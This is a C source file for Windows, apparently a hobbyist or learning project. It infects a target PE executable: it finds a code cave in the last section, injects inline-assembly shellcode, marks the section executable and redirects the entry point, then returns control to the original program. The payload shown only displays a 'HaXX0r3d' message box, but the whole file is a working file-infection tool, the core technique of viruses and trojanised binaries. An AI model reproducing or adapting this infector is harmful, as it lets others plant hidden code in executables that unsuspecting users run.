#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include <Windows.h>

#include "main.h"

#define db(x) __asm _emit x

__declspec(naked) ShellcodeStart(VOID) {
	__asm {
			pushad
			call	routine

		routine:
			pop		ebp
			sub		ebp, offset routine
			push	0								// MB_OK
			lea		eax, [ebp + szCaption]
			push	eax								// lpCaption
			lea		eax, [ebp + szText]
			push	eax								// lpText
			push	0								// hWnd
			mov		eax, 0xAAAAAAAA
			call	eax								// MessageBoxA

			popad
			push	0xAAAAAAAA						// OEP
			ret

		szCaption:
			db('d') db('T') db('m') db(' ') db('W') db('u') db('Z') db(' ')
			db('h') db('3') db('r') db('e') db(0)
		szText :
			db('H') db('a') db('X') db('X') db('0') db('r') db('3') db('d')
			db(' ') db('b') db('y') db(' ') db('d') db('T') db('m') db(0)
	}
}

VOID ShellcodeEnd(VOID) {

}

VOID Error(LPCSTR s) {
	fprintf(stderr, "%s error: %lu\n", s, GetLastError());
}

VOID Debug(LPCSTR fmt, ...) {
	va_list va;
	CHAR szBuf[BUFSIZ];

	va_start(va, fmt);

	vsnprintf(szBuf, sizeof(szBuf), fmt, va);

	va_end(va);

	printf("%s\n", szBuf);
}

VOID CleanUp(HANDLE hFile, HANDLE hMapping, PUCHAR lpFile) {
	if (lpFile != NULL) UnmapViewOfFile(lpFile);
	if (hMapping != NULL) CloseHandle(hMapping);
	if (hFile != NULL) CloseHandle(hFile);
}

int main(int argc, char *argv[]) {
	if (argc < 2) {
		fprintf(stderr, "Usage: %s <TARGET FILE>\n", argv[0]);
		return 1;
	}

	HANDLE hFile = NULL;
	HANDLE hMapping = NULL;
	PUCHAR lpFile = NULL;

	hFile = CreateFile(argv[1], FILE_READ_ACCESS | FILE_WRITE_ACCESS, 
						0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		Error("Create file");
		return 1;
	}

	DWORD dwFileSize = GetFileSize(hFile, NULL);

	hMapping = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, dwFileSize, NULL);
	if (hMapping == NULL) {
		CleanUp(hFile, hMapping, lpFile);
		Error("Create file mapping");
		return 1;
	}

	lpFile = (PUCHAR)MapViewOfFile(hMapping, FILE_MAP_READ | FILE_MAP_WRITE, 
									0, 0, dwFileSize);
	if (lpFile == NULL) {
		Error("Map file");
		CleanUp(hFile, hMapping, lpFile);
		return 1;
	}

	if (VerifyDOS(GetDosHeader(lpFile)) == FALSE ||
		VerifyPE(GetPeHeader(lpFile)) == FALSE) {
		fprintf(stderr, "Not a valid PE file\n");
		CleanUp(hFile, hMapping, lpFile);
		return 1;
	}

	PIMAGE_NT_HEADERS pinh = GetPeHeader(lpFile);
	PIMAGE_SECTION_HEADER pish = GetLastSectionHeader(lpFile);

	DWORD dwOEP = pinh->OptionalHeader.AddressOfEntryPoint + 
					pinh->OptionalHeader.ImageBase;
	Debug("Found OEP: 0x%08x\n", dwOEP);

	DWORD dwShellcodeSize = (DWORD)ShellcodeEnd - (DWORD)ShellcodeStart;
	Debug("Size of shellcode: 0x%08x\n", dwShellcodeSize);
	
	// find code cave
	DWORD dwCount = 0;
	DWORD dwPosition = 0;

	for (dwPosition = pish->PointerToRawData; dwPosition < dwFileSize; dwPosition++) {
		if (*(lpFile + dwPosition) == 0x00) {
			if (dwCount++ == dwShellcodeSize) {
				// backtrack to the beginning of the code cave
				dwPosition -= dwShellcodeSize;
				Debug("Found code cave @ [0x%08x]\n", dwPosition);
				break;
			}
		} else {
			// reset counter if failed to find large enough cave
			dwCount = 0;
		}
	}

	if (dwCount == 0 || dwPosition == 0) {
		Debug("Failed to find suitable cave 1");
		CleanUp(hFile, hMapping, lpFile);
		return 1;
	}

	// dynamically obtain address of function
	HMODULE hModule = LoadLibrary("user32.dll");
	if (hModule == NULL) {
		Error("Load library");
		CleanUp(hFile, hMapping, lpFile);
		return 1;
	}

	LPVOID lpAddress = GetProcAddress(hModule, "MessageBoxA");
	if (lpAddress == NULL) {
		Error("Get proc address");
		FreeLibrary(hModule);
		CleanUp(hFile, hMapping, lpFile);
		return 1;
	}

	// create buffer for shellcode
	HANDLE hHeap = HeapCreate(0, 0, dwShellcodeSize);
	if (hHeap == NULL) {
		Error("Heap create");
		CleanUp(hFile, hMapping, lpFile);
		return 1;
	}

	LPVOID lpHeap = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwShellcodeSize);
	if (lpHeap == NULL) {
		Error("Heap alloc");
		HeapDestroy(hHeap);
		CleanUp(hFile, hMapping, lpFile);
		return 1;
	}

	// move shellcode to buffer to modify
	memcpy(lpHeap, ShellcodeStart, dwShellcodeSize);
	
	// modify function address offset
	DWORD dwIncrementor = 0;
	for (; dwIncrementor < dwShellcodeSize; dwIncrementor++) {
		if (*((LPDWORD)lpHeap + dwIncrementor) == 0xAAAAAAAA) {
			Debug("Injecting [0x%08x] into function address offset", (DWORD)lpAddress);
			*((LPDWORD)lpHeap + dwIncrementor) = (DWORD)lpAddress;
			FreeLibrary(hModule);
			break;
		}
	}

	// modify OEP address offset
	for (; dwIncrementor < dwShellcodeSize; dwIncrementor++) {
		if (*((LPDWORD)lpHeap + dwIncrementor) == 0xAAAAAAAA) {
			Debug("Injecting OEP [0x%08x] into OEP offset\n", dwOEP);
			*((LPDWORD)lpHeap + dwIncrementor) = dwOEP;
			break;
		}
	}

	// shellcode dump
	Debug("Shellcode dump:");
	for (int i = 0; i < dwShellcodeSize; i++) {
		printf("\\x%02x", *((PUCHAR)lpHeap + i));
	}
	printf("\n\n");

	// copy the shellcode into code cave
	memcpy((PUCHAR)(lpFile + dwPosition), lpHeap, dwShellcodeSize);
	Debug("Injected shellcode into file\n");
	HeapFree(hHeap, 0, lpHeap);
	HeapDestroy(hHeap);

	// update PE file information
	pish->Misc.VirtualSize += dwShellcodeSize;
	// make section executable
	pish->Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
	// set entry point
	// RVA = file offset + virtual offset - raw offset
	pinh->OptionalHeader.AddressOfEntryPoint = dwPosition + pish->VirtualAddress - pish->PointerToRawData;
	Debug("Modified EP to 0x%08x\n", pinh->OptionalHeader.AddressOfEntryPoint);

	CleanUp(hFile, hMapping, lpFile);

	Debug("Infection complete");

	return 0;
}
